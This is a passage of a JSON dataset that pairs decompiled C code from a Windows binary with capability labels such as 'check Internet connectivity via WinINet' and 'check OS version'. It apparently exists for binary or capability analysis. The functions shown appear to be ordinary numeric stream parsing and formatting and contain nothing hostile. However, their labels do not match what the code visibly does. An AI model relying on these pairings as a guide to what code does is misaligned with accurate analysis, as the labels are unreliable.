iVar10 = *piVar17;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar26 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar26)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar26 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar26) {\n                    uVar2 = 1;\n                    goto code_r0x00014005ab80;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x00014005aac4;\n                    piStack104 = NULL;\n                }\n                if (uVar22 < 0xb) goto code_r0x00014005ad90;\n                uVar25 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x00014005af34:\n                if (5 < uVar11 - 0x41) goto code_r0x00014005ad90;\n                iVar12 = uVar25 - 0x37;\n            } while( true );\n        }\n        uVar16 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar24 = 0;\n            uVar16 = 0;\ncode_r0x00014005af70:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar18 = iVar13 + 0x9c;\n                iVar20 = iStack160;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x00014005ad90;\n                while (uVar11 != *puVar18) {\n                    iVar20 = iVar20 + -1;\n                    puVar18 = puVar18 + 1;\n                    if (iVar20 == 0) goto code_r0x00014005ad90;\n                }\n                iVar12 = puVar18 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar16 <= uVar15) {\n                    uVar21 = uVar16 * uVar19;\n                    uVar16 = iVar12 + uVar21;\n                    iVar23 = iVar23 + 1;\n                    uVar6 = uVar24 | CARRY8(iVar12, uVar21);\n                }\n            }\n            else {\n                if (iVar23 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x00014005ab80;\n                }\n                fcn.14007da40(aiStack80, iVar23);\n                iVar23 = 0;\n                uVar6 = uVar24;\n            }\n            uVar24 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar17 = piStack104[2] + 1;\n                piStack104[2] = piVar17;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar17 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar17 < piVar14) {\n                iVar10 = *piVar17;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar26 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar26)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar26 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar26) goto code_r0x00014005ab80;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x00014005af70;\n        }\n        uVar16 = 0;\n        uVar24 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x00014005ab80:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014005ada5;\ncode_r0x00014005ab90:\n    if ((iVar23 != 0) || (bVar3)) {\ncode_r0x00014005ade9:\n        if (uVar7 == 0) {\n            if (uVar24 == 0) {\n                if (bVar27) {\n                    uVar16 = -uVar16;\n                }\n                *in_stack_00000038 = uVar16;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffffffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x00014005abc0;\n        }\n    }\n    goto code_r0x00014005aba3;\ncode_r0x00014005ad90:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014005ab90;\ncode_r0x00014005ada5:\n    fcn.14007da40(aiStack80, iVar23);\n    cVar8 = fcn.1400b76a0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar23 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014005ade9;\ncode_r0x00014005aba3:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014005abc0:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar23 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar23 == 0) {\n        iVar23 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar23 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar23 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar23 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4574
    },
    "14005b34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14005b340(uint *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int64_t *piVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    ulong arg2;\n    int64_t iVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint8_t uVar17;\n    uint8_t uVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    int64_t in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t *in_stack_00000038;\n    uint8_t uStack145;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    ulong uStack104;\n    uint uStack96;\n    uint uStack92;\n    int64_t aiStack80 [2];\n    \n    uStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar10 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar4 = fcn.140029ee0(&uStack104, &piStack120);\n    if (uVar4 == 0) {\n        iVar7 = fcn.140029f90(&uStack104);\n        iVar8 = *(iVar10 + 0x96);\n        cVar5 = *(iVar10 + 0x20);\n        if (iVar8 == iVar7) {\n            if (cVar5 == '\\0') {\n                uVar15 = 0x2b;\n                iVar8 = *(iVar10 + 0x48);\n                goto joined_r0x00014005bf98;\n            }\ncode_r0x00014005beda:\n            if ((*(iVar10 + 0x4a) == iVar7) || (*(iVar10 + 0x48) == iVar7)) goto code_r0x00014005bc78;\n            uVar15 = (iVar8 != iVar7) + 0x2b + (iVar8 != iVar7);\n        }\n        else {\n            if (*(iVar10 + 0x94) != iVar7) goto code_r0x00014005bc78;\n            if (cVar5 != '\\0') goto code_r0x00014005beda;\n            uVar15 = 0x2d;\n            iVar8 = *(iVar10 + 0x48);\njoined_r0x00014005bf98:\n            if (iVar7 == iVar8) goto code_r0x00014005bc78;\n        }\n        fcn.14007da40(in_stack_00000038, uVar15);\n        fcn.14009c0a0(uStack104);\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        uVar19 = fcn.140029ee0(&uStack104, &piStack120);\n        if (uVar19 == 0) {\n            iVar7 = fcn.140029f90(&uStack104);\n            cVar5 = *(iVar10 + 0x20);\ncode_r0x00014005bc78:\n            piVar2 = *0x14010fc90;\n            uVar17 = 0;\n            iVar16 = 0;\n            do {\n                if ((((cVar5 != '\\0') && (uVar19 = uVar4,  *(iVar10 + 0x4a) == iVar7)) ||\n                    (uVar19 = uVar4,  *(iVar10 + 0x48) == iVar7)) || (*(iVar10 + 0x9c) != iVar7))\n                goto code_r0x00014005b3c0;\n                if (uVar17 == 0) {\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005bd80:\n                        fcn.14007d790(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (*piVar2 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x00014005bd80;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x30;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + 1 + iVar14) = 0;\n                }\n                piVar3 = uStack104;\n                iVar16 = iVar16 + 1;\n                if (uStack104[2] < uStack104[3]) {\n                    piVar13 = uStack104[2] + 1;\n                    uStack104[2] = piVar13;\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar13 < uStack104[3]) goto code_r0x00014005bce7;\ncode_r0x00014005be20:\n                    iVar8 = (**(*piVar3 + 0x48))(piVar3);\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    piVar13 = piVar3[2];\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar3[3] <= piVar13) goto code_r0x00014005be20;\ncode_r0x00014005bce7:\n                    iVar8 = *piVar13;\n                }\n                if (iVar8 == -1) {\n                    uStack104 = NULL;\n                }\n                bVar20 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar20)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar20 = iVar9 == -1;\n                }\n                if (bVar20 == (iVar8 == -1)) goto code_r0x00014005bd1e;\n                iVar7 = -1;\n                if (uStack104 != NULL) {\n                    if (uStack104[2] < uStack104[3]) {\n                        iVar7 = *uStack104[2];\n                    }\n                    else {\n                        iVar7 = (**(*uStack104 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack104 = NULL;\n                    }\n                }\n                cVar5 = *(iVar10 + 0x20);\n                uVar17 = 1;\n            } while( true );\n        }\n        uVar17 = 0;\n        iVar16 = 0;\n    }\n    else {\n        iVar7 = 0;\n        iVar16 = 0;\n        uVar17 = 0;\n        uVar19 = uVar4;\n    }\n    goto code_r0x00014005b3c0;\ncode_r0x00014005b961:\n    if (uStack104 == NULL) {\n        iVar7 = -1;\n    }\n    else {\n        if (uStack104[2] < uStack104[3]) {\n            iVar7 = *uStack104[2];\n        }\n        else {\n            iVar7 = (**(*uStack104 + 0x48))();\n        }\n        if (iVar7 == -1) {\n            uStack104 = NULL;\n        }\n    }\n    iVar8 = *(iVar10 + 0x96);\n    uVar6 = *(iVar10 + 0x20);\n    if ((((iVar8 != iVar7) && (uVar19 = uVar18,  uVar17 = uVar18,  *(iVar10 + 0x94) != iVar7)) ||\n        ((uVar6 != 0 && (uVar19 = uVar6,  uVar17 = uVar6,  *(iVar10 + 0x4a) == iVar7)))) ||\n       (uVar19 = uVar18,  uVar17 = uVar18,  *(iVar10 + 0x48) == iVar7)) goto code_r0x00014005b5e0;\n    fcn.14007da40(in_stack_00000038, (iVar8 != iVar7) + 0x2b + (iVar8 != iVar7));\ncode_r0x00014005b689:\n    piVar3 = uStack104;\n    if (uStack104[2] < uStack104[3]) {\n        piVar13 = uStack104[2] + 1;\n        uStack104[2] = piVar13;\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        if (uStack104[3] <= piVar13) {\ncode_r0x00014005bb68:\n            iVar7 = (**(*piVar3 + 0x48))(piVar3);\n            goto joined_r0x00014005b6c1;\n        }\n    }\n    else {\n        (**(*uStack104 + 0x50))(uStack104);\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        piVar13 = piVar3[2];\n        if (piVar3[3] <= piVar13) goto code_r0x00014005bb68;\n    }\n    iVar7 = *piVar13;\njoined_r0x00014005b6c1:\n    if (iVar7 == -1) {\n        uStack104 = NULL;\n    }\n    bVar20 = uStack112 == -1;\n    if ((piStack120 != NULL) && (bVar20)) {\n        if (piStack120[2] < piStack120[3]) {\n            iVar8 = *piStack120[2];\n        }\n        else {\n            iVar8 = (**(*piStack120 + 0x48))();\n        }\n        if (iVar8 == -1) {\n            piStack120 = NULL;\n        }\n        bVar20 = iVar8 == -1;\n    }\n    if ((iVar7 == -1) == bVar20) goto code_r0x00014005b6fa;\n    if (uStack104 == NULL) {\n        uVar6 = *(iVar10 + 0x20);\n        iVar7 = -1;\n    }\n    else {\n        if (uStack104[2] < uStack104[3]) {\n            iVar7 = *uStack104[2];\n        }\n        else {\n            iVar7 = (**(*uStack104 + 0x48))();\n        }\n        if (iVar7 == -1) {\n            uStack104 = NULL;\n        }\n        uVar6 = *(iVar10 + 0x20);\n    }\n    goto code_r0x00014005b5e0;\ncode_r0x00014005bf58:\n    iVar11 = aiStack80[0];\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014005b750;\n    goto code_r0x00014005b72e;\ncode_r0x00014005bd1e:\n    uVar17 = 1;\n    uVar19 = 1;\ncode_r0x00014005b3c0:\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar10 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar4 = *(iVar10 + 200);\n    if (uVar4 == 0) {\n        if (uVar19 == 0) {\n            uStack145 = 0;\ncode_r0x00014005b410:\n            do {\n                if (9 < iVar7 - 0x30U) goto code_r0x00014005b516;\n                iVar11 = *in_stack_00000038;\n                iVar14 = *(iVar11 + -0x18);\n                uVar15 = iVar14 + 1;\n                if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005b44c:\n                    fcn.14007d790(in_stack_00000038, uVar15);\n                }\n                else {\n                    if (**0x14010fc90 == 0) {\n                        iVar1 = *(iVar11 + -8);\n                    }\n                    else {\n                        iVar1 = *(iVar11 + -8);\n                    }\n                    if (0 < iVar1) goto code_r0x00014005b44c;\n                }\n                *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = iVar7;\n                iVar11 = *in_stack_00000038;\n                *(iVar11 + -8) = 0;\n                *(iVar11 + -0x18) = uVar15;\n                *(iVar11 + 1 + iVar14) = 0;\n                uVar17 = 1;\ncode_r0x00014005b47c:\n                piVar3 = uStack104;\n                if (uStack104[2] < uStack104[3]) {\n                    piVar13 = uStack104[2] + 1;\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    uStack104[2] = piVar13;\n                    if (piVar13 < uStack104[3]) goto code_r0x00014005b4a9;\ncode_r0x00014005bae0:\n                    iVar7 = (**(*piVar3 + 0x48))(piVar3);\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    piVar13 = piVar3[2];\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar3[3] <= piVar13) goto code_r0x00014005bae0;\ncode_r0x00014005b4a9:\n                    iVar7 = *piVar13;\n                }\n                if (iVar7 == -1) {\n                    uStack104 = NULL;\n                }\n                bVar20 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar20)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar8 = *piStack120[2];\n                    }\n                    else {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar8 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar20 = iVar8 == -1;\n                }\n                if ((iVar7 == -1) == bVar20) goto code_r0x00014005b6fa;\n                if (uStack104 != NULL) {\n                    if (uStack104[2] < uStack104[3]) {\n                        iVar7 = *uStack104[2];\n                    }\n                    else {\n                        iVar7 = (**(*uStack104 + 0x48))();\n                    }\n                    if (iVar7 != -1) goto code_r0x00014005b410;\n                    uStack104 = NULL;\ncode_r0x00014005b516:\n                    if ((*(iVar10 + 0x48) == iVar7) && ((uStack145 | uVar19) == 0)) {\n                        uStack145 = 1;\n                        fcn.14007da40(in_stack_00000038, 0x2e);\n                        uVar19 = 0;\n                    }\n                    else {\n                        if (((*(iVar10 + 0xb8) != iVar7) && (*(iVar10 + 0xc4) != iVar7)) ||\n                           (uVar17 = uVar17 & (uVar19 ^ 1),  uVar17 == 0)) goto code_r0x00014005b6fa;\n                        fcn.14007da40(in_stack_00000038, 0x65);\n                        fcn.14009c0a0(uStack104);\n                        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                        cVar5 = fcn.140029ee0(&uStack104, &piStack120);\n                        if (cVar5 != '\\0') goto code_r0x00014005bf58;\n                        iVar7 = fcn.140029f90(&uStack104);\n                        uVar19 = uVar17;\n                        if (iVar7 == *(iVar10 + 0x96)) {\n                            arg2 = 0x2b;\n                        }\n                        else {\n                            arg2 = 0x2d;\n                            if (iVar7 != *(iVar10 + 0x94)) goto code_r0x00014005b410;\n                        }\n                        fcn.14007da40(in_stack_00000038, arg2);\n                    }\n                    goto code_r0x00014005b47c;\n                }\n                iVar7 = -1;\n            } while( true );\n        }\ncode_r0x00014005c00b:\n        iVar11 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014005b750;\ncode_r0x00014005b718:\n        fcn.14007da40(aiStack80, iVar16);\n    }\n    else {\n        if (uVar19 != 0) goto code_r0x00014005c00b;\n        uStack145 = 0;\n        uVar6 = *(iVar10 + 0x20);\ncode_r0x00014005b5e0:\n        cVar5 = iVar16;\n        if ((uVar6 == 0) || (*(iVar10 + 0x4a) != iVar7)) {\n            piVar13 = iVar10 + 0x9c;\n            if (*(iVar10 + 0x48) == iVar7) {\n                uVar19 = uVar19 | uStack145;\n                if (uVar19 == 0) {\n                    if (*(aiStack80[0] + -0x18) != 0) {\n                        fcn.14007da40(aiStack80, cVar5);\n                    }\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005b7ec:\n                        fcn.14007d790(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (**0x14010fc90 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x00014005b7ec;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x2e;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + 1 + iVar14) = 0;\n                    uStack145 = uVar4;\n                    goto code_r0x00014005b689;\n                }\n                goto code_r0x00014005bf58;\n            }\n            do {\n                if (iVar7 == *piVar13) {\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005b65b:\n                        fcn.14007d790(in_stack_00000038, uVar15);\ncode_r0x00014005b666:\n                        iVar11 = *in_stack_00000038;\n                        iVar14 = *(iVar11 + -0x18);\n                    }\n                    else {\n                        if (**0x14010fc90 != 0) {\n                            if (0 < *(iVar11 + -8)) goto code_r0x00014005b65b;\n                            goto code_r0x00014005b666;\n                        }\n                        if (0 < *(iVar11 + -8)) goto code_r0x00014005b65b;\n                    }\n                    *(iVar11 + iVar14) = (piVar13 - (iVar10 + 0x9c) >> 1) + '0';\n                    iVar11 = *in_stack_00000038;\n                    iVar16 = iVar16 + 1;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + uVar15) = 0;\n                    uVar17 = uVar4;\n                    goto code_r0x00014005b689;\n                }\n                piVar13 = piVar13 + 1;\n            } while (iVar10 + 0xb0 != piVar13);\n            if ((*(iVar10 + 0xb8) == iVar7) || (*(iVar10 + 0xc4) == iVar7)) {\n                uVar18 = uVar17 & (uVar19 ^ 1);\n                if (uVar18 != 0) {\n                    if ((*(aiStack80[0] + -0x18) != 0) && (uStack145 == 0)) {\n                        fcn.14007da40(aiStack80, cVar5);\n                    }\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005b8ca:\n                        fcn.14007d790(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (**0x14010fc90 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x00014005b8ca;\n                    }\n                    piVar3 = uStack104;\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x65;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + 1 + iVar14) = 0;\n                    piVar13 = uStack104[3];\n                    if (uStack104[2] < piVar13) {\n                        piVar12 = uStack104[2] + 1;\n                        uStack104[2] = piVar12;\n                    }\n                    else {\n                        (**(*uStack104 + 0x50))(uStack104);\n                        piVar12 = piVar3[2];\n                        piVar13 = piVar3[3];\n                    }\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar12 < piVar13) {\n                        iVar7 = *piVar12;\n                    }\n                    else {\n                        iVar7 = (**(*piVar3 + 0x48))(piVar3);\n                    }\n                    if (iVar7 == -1) {\n                        uStack104 = NULL;\n                    }\n                    bVar20 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar20)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar8 = *piStack120[2];\n                        }\n                        else {\n                            iVar8 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar8 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar20 = iVar8 == -1;\n                    }\n                    if ((iVar7 == -1) != bVar20) goto code_r0x00014005b961;\n                    goto code_r0x00014005bf58;\n                }\n            }\n        }\n        else {\n            uStack145 = uStack145 | uVar19;\n            if (uStack145 != 0) goto code_r0x00014005bf58;\n            if (iVar16 != 0) {\n                iVar11 = *(aiStack80[0] + -0x18);\n                uVar15 = iVar11 + 1;\n                if (*(aiStack80[0] + -0x10) < uVar15) {\ncode_r0x00014005ba47:\n                    fcn.14007d790(aiStack80, uVar15);\n                }\n                else {\n                    if (**0x14010fc90 == 0) {\n                        iVar16 = *(aiStack80[0] + -8);\n                    }\n                    else {\n                        iVar16 = *(aiStack80[0] + -8);\n                    }\n                    if (0 < iVar16) goto code_r0x00014005ba47;\n                }\n                *(aiStack80[0] + *(aiStack80[0] + -0x18)) = cVar5;\n                iVar16 = 0;\n                *(aiStack80[0] + -8) = 0;\n                *(aiStack80[0] + -0x18) = uVar15;\n                *(aiStack80[0] + 1 + iVar11) = 0;\n                uVar19 = 0;\n                goto code_r0x00014005b689;\n            }\n            fcn.14007d8a0(in_stack_00000038, 0, *(*in_stack_00000038 + -0x18), 0);\n            uVar19 = 0;\n        }\ncode_r0x00014005b6fa:\n        iVar11 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014005b750;\n        if ((uStack145 == 0) && (uVar19 == 0)) goto code_r0x00014005b718;\n    }\ncode_r0x00014005b72e:\n    iVar11 = aiStack80[0];\n    cVar5 = fcn.1400b76a0(*(iVar10 + 0x10), *(iVar10 + 0x18), aiStack80);\n    if (cVar5 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\ncode_r0x00014005b750:\n    *arg1 = uStack104;\n    arg1[1] = uStack104._4_4_;\n    arg1[2] = uStack96;\n    arg1[3] = uStack92;\n    fcn.14007bf20(iVar11 + -0x18);\n    return arg1;\n}\n",
        "token_count": 6144
    },
    "14005d65": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005d650(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    uchar *arg1_00;\n    uint64_t arg2;\n    uchar *puVar7;\n    uchar *arg4_01;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack192;\n    uchar auStack184 [24];\n    ulong uStack160;\n    uint32_t uStack152;\n    ulong uStack144;\n    uchar auStack136 [2];\n    uchar auStack134 [18];\n    uchar auStack116 [20];\n    uint32_t uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    ulong uStack80;\n    ulong var_14h;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x14005d688;\n    iVar6 = fcn.140026e80(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar9 = &stack0xffffffffffffff48;\n    puVar10 = &stack0xffffffffffffff48;\n    arg2 = noname_5;\n    puStack88 = &stack0xffffffffffffff78;\n    uStack96 = uVar1 & 0x4a;\n    bVar13 = uStack96 != 0x40;\n    bVar14 = uStack96 != 8;\n    if ((noname_5 < 1) && (arg2 = -noname_5,  !bVar13 || !bVar14)) {\n        arg2 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff8c;\n    uStack152 = bVar13 && bVar14;\n    uStack80 = CONCAT44(uStack80._4_4_, uVar1);\n    uStack192 = 0x14005d6e2;\n    iVar5 = fcn.1400b5d80(arg1_00, arg2, iVar6 + 0x4a, uVar1);\n    iVar12 = iVar5;\n    puVar7 = puStack88 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005d70e;\ncode_r0x00014005d84b:\n        arg4_01 = puVar7;\n        if (((uStack80 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack96 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iVar6 + 0x4c + (uStack80 >> 0xe & 1));\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n        }\ncode_r0x00014005d720:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005d72c;\n    }\n    else {\n        puStack88 = puStack88 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        uStack192 = 0x14005d800;\n        iVar11 = fcn.1400147b0(arg1_00);\n        cVar8 = *(iVar6 + 0x49);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff48 + iVar11;\n        puVar10 = &stack0xffffffffffffff48 + iVar11;\n        arg3_00 = *(iVar6 + 0x10);\n        *(&stack0xffffffffffffff70 + iVar11) = puVar7 + iVar12;\n        *(&stack0xffffffffffffff68 + iVar11) = puVar7;\n        uStack80 = &stack0xffffffffffffff7a + iVar11;\n        *(&stack0xffffffffffffff40 + iVar11) = 0x14005d831;\n        iVar5 = fcn.1400b60e0(&stack0xffffffffffffff7a + iVar11, cVar8, arg3_00, arg4_00);\n        iVar5 = iVar5 - uStack80;\n        arg1_00 = uStack80;\n        puVar7 = uStack80;\n        uStack80._0_4_ = puStack88;\n        if (!bVar13 || !bVar14) goto code_r0x00014005d84b;\ncode_r0x00014005d70e:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4a);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x00014005d720;\n        }\n        arg4_01 = puVar7;\n        if ((uStack80 & 0x800) == 0) goto 